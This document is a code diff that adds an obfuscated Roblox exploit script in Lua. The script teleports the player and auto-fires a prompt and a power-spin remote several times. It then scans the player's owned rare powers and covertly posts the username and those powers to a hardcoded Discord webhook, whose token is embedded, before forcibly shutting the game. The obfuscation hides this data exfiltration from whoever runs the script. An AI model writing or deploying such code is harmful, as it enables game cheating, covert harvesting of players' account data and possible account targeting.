@@ -1,1 +1,12 @@
-# adad
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
+
+]]--
+
+local v0=game:GetService("Players");local v1=game:GetService("TweenService");local v2=game:GetService("ReplicatedStorage");local v3=game:GetService("HttpService");local v4=v0.LocalPlayer;local v5=Vector3.new(44.126599999999996 + 232 ,163.5923 -106 , -(395.9151 -190));local v6=v4.Character or v4.CharacterAdded:Wait() ;local v7=v6:WaitForChild("HumanoidRootPart");local v8=TweenInfo.new(1639 -(1523 + 114) ,Enum.EasingStyle.Linear);local v9=v1:Create(v7,v8,{CFrame=CFrame.new(v5)});v9:Play();v9.Completed:Wait();local v10=workspace:FindFirstChildWhichIsA("ProximityPrompt",true);if v10 then fireproximityprompt(v10);end local v11=v2:WaitForChild("Remotes"):WaitForChild("AttemptPowerSpin");local v12=v4.PlayerGui.ShopGui.StoreHolder.Store.PAGES.Powers.Owned;local v13="https://discord.com/api/webhooks/1408371867508801637/cD9Np2_Vn1qj2DHapQf6b7Vs69XRV8ZlT1yd6InPNL1Q7had-n--TP8-TJ1JG-Nv0pKR";local v14={["PHANTHOM STEP"]=true,["WEAPON SMUGGLER"]=true,HERCULES=true,QUICKSILVER=true,["TIME STOP"]=true,["LIGHTNING GOD"]=true,["THE DOCTOR"]=true};for v16=2 -1 ,623 -(555 + 64)  do local v17=0 -0 ;while true do if (v17==(931 -(857 + 74))) then v11:FireServer();task.wait(574 -(367 + 201) );break;end end end task.wait(931 -(214 + 713) );local v15={};for v18,v19 in ipairs(v12:GetChildren()) do if (v19:IsA("TextButton") and v19.Visible and v14[v19.Name]) then table.insert(v15,"``ㅤ"   .. v19.Name   .. "ㅤ``" );end end if ( #v15>(117 -(32 + 85))) then local v20=table.concat(v15,"\n");local v21={content=nil,embeds={{fields={{name="⚠️ Name :",value="``ㅤ"   .. v4.Name   .. "ㅤ``" },{name="Show Powers :",value=v20}}}},attachments={}};if (typeof(request)=="function") then pcall(function() request({Url=v13,Method="POST",Headers={["Content-Type"]="application/json"},Body=v3:JSONEncode(v21)});end);end end game:Shutdown();
